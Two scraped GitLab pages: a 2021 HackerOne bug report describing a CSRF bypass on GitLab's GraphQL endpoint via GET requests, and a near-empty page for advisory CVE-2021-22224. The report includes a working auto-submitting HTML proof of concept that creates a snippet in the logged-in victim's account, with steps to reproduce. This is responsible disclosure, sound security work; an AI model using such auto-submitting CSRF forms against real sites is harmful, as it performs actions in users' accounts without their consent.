=== Content from gitlab.com_1d81e682_20250114_224703.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# CSRF on /api/graphql allows executing mutations through GET requests

**[HackerOne report #1122408](https://hackerone.com/reports/1122408)** by `az3z3l` on 2021-03-10, assigned to [@dcouture](/dcouture "Dominic Couture"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

Mutations are `edit` or `create` queries used in Graphql. Gitlab prevents CSRF in this functionality by sending a POST request with a X-CSRF-Token header. The bug I found here was that, when we send a GET request, the backend does not expect the X-CSRF-Token header. Using this, an attacker could leverage this to bypass the existing CSRF protection

##### Code for Testing

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="referrer" content="none">
    <meta name="referrer" content="no-referrer">
</head>
<body>
      <form action="https://gitlab.com/api/graphql/" id="csrf-form" method="GET">
        <input name="query" value="mutation CreateSnippet($input: CreateSnippetInput!) {  createSnippet(input: $input) {    errors    snippet {      webUrl      __typename    }    needsCaptchaResponse    captchaSiteKey    __typename  }}">
        <input name="variables" value='{"input":{"title":"Tesssst Snippet","description":"Hello World","visibilityLevel":"public","blobActions":[{"action":"create","previousPath":"readme.md","content":"reading this.md","filePath":"readme.md"}],"uploadedFiles":[],"projectPath":""}}'>
    </form>

    <script>document.getElementById("csrf-form").submit()</script>
</body>
</html>
```

This exploit would create a snippet named `Tesssst Snippet` on the user's account.

##### Steps to Reproduce

1. Host this file
2. Login to gitlab
3. Open the link to that html
4. Check the snippets for the logged in user.

##### Impact

The attacker could control bypass the existing CSRF check on the graphql endpoint.

##### POC

Attached the request and response screenshot

##### What is the expected *correct* behavior?

The backend must check the existence of csrf tokens for GET requests as well.

#### Impact

The attacker could control bypass the existing CSRF check on the graphql endpoint.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [gitlabCreateSnippet.png](https://h1.sec.gitlab.net/a/e31de647-a04a-4eb5-aa81-2b3861a2579f/gitlabCreateSnippet.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_264be34f_20250114_224702.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2021](/gitlab-org/cves/-/tree/master/2021)
* [**CVE-2021-22224.json**](/gitlab-org/cves/-/blob/master/2021/CVE-2021-22224.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2021/CVE-2021-22224.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2021/CVE-2021-22224.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  Jul 05, 2021

  [dad812cb](/gitlab-org/cves/-/commit/dad812cb20874dd12976eea61706162464d8dca8)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/dad812cb20874dd12976eea61706162464d8dca8)
  ·
  dad812cb

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Jul 05, 2021

  dad812cb

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/dad812cb20874dd12976eea61706162464d8dca8)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Jul 05, 2021

Loading


